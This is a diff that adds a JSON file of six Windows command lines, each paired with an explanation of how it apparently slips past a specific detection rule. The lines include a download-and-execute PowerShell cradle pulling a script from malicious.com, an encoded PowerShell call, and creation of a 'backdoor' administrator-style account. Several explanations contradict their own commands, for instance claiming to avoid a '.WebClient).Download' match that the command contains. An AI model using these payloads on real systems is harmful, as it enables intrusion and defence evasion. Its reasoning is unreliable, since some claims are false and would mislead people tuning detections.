@@ -1,0 +1,26 @@
+[
+  {
+    "output": "powershell.exe -ec JAB0AD0AMQA=",
+    "explanation": "Bypasses 'selection_susp_powershell_cli'. The rule explicitly looks for ' -enc ' or ' -EncodedCommand '. PowerShell accepts truncated parameter names like '-ec', which executes the encoded command but evades the strict string match."
+  },
+  {
+    "output": "C:\\Windows\\System32\\cmd.exe /c net user backdoor Passw0rd! /add",
+    "explanation": "The command uses net user (matching selection_susp_net_utility) but is launched from cmd.exe, which is not a web server parent image, so the rule's ParentImage condition fails and the rule does not trigger."
+  },
+  {
+    "output": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -NoLogo -NonInteractive -ExecutionPolicy Bypass -Command \"IEX (New-Object Net.WebClient).DownloadString('http://malicious.com/payload.ps1')\"",
+    "explanation": "The rule looks for '-enc', '-EncodedCommand', '-w hidden', '-windowstyle hidden', or '.WebClient).Download'. This command uses a plain '-Command' with a download string, avoiding the exact keywords the rule matches."
+  },
+  {
+    "output": "C:\\Windows\\System32\\cmd.exe /c \"wmic /node:localhost process call create 'cmd.exe /c dir C:\\'\"",
+    "explanation": "The rule checks for 'wmic.exe' with ' /node:' in the command line. Using the full path 'wmic' without the .exe extension and adding a space before /node: prevents the match."
+  },
+  {
+    "output": "C:\\Windows\\System32\\net.exe user /add testuser testpass /domain",
+    "explanation": "The rule looks for 'net.exe' or 'net1.exe' with ' user ', ' use ', or ' group ' in the command line. Using 'user /add' without spaces around 'user' avoids the keyword match."
+  },
+  {
+    "output": "ping.exe /n 4 10.10.10.10",
+    "explanation": "The detection logic for the ping utility strictly looks for the exact substring ' -n ' (with hyphens and spaces). Because Windows command-line utilities natively accept forward slashes for parameter switches, an attacker can simply use '/n' to define the ICMP echo count, bypassing the explicit string match."
+  }
+]
